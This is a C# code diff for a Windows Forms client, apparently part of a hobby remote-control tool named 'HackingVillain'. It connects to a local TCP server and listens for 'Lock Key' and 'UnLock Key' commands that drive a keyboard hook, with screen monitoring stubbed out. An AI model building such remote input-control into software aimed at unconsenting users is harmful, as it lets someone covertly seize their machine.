@@ -5,27 +5,60 @@ using System.Data;
 using System.Drawing;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
+using System.Threading;
 using System.Windows.Forms;
-using Network;
+using AwesomeSockets.Buffers;
+using AwesomeSockets.Sockets;
+using AwesomeSockets.Domain.Sockets;
 
+using Buffer = AwesomeSockets.Buffers.Buffer;
 namespace HackingVillain
 {
     public partial class Client : Form
     {
-        NetworkClient _client;
-        ClientInfo _info;
+        ISocket _client;
+        Hooker _hook;
+        ScreenMonitor _monitor;
+        Thread _listen;
         public Client()
         {
             InitializeComponent();
-            _client = new NetworkClient("127.0.0.1", 8080);
-            _client.Connect();
-            _info = new ClientInfo(NetworkClient.myIP, NetworkClient.myNick);
+            _client = AweSock.TcpConnect("127.0.0.1", 8080);
+            _hook = new Hooker(_client);
+            //_monitor = new ScreenMonitor(_client);
+
+            _listen = new Thread(() =>
+            {
+                while (true)
+                {
+                    Listen();
+                }
+            });
+
+            _listen.Start();
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        ~Client()
         {
-            _client.Send(new Data(DataType.STRING, textBox1.Text, _info));
+            _hook.Dispose();
+        }
+
+        void Listen()
+        {
+            Buffer coming = Buffer.New();
+            _client.ReceiveMessage(coming);
+            Buffer.FinalizeBuffer(coming);
+
+            string data = Encoding.UTF32.GetString(Buffer.GetBuffer(coming));
+            data = data.TrimEnd('\0');
+            if(data == "Lock Key")
+            {
+                _hook.Lock();
+            }
+            else if(data == "UnLock Key")
+            {
+                _hook.UnLock();
+            }
         }
     }
 }
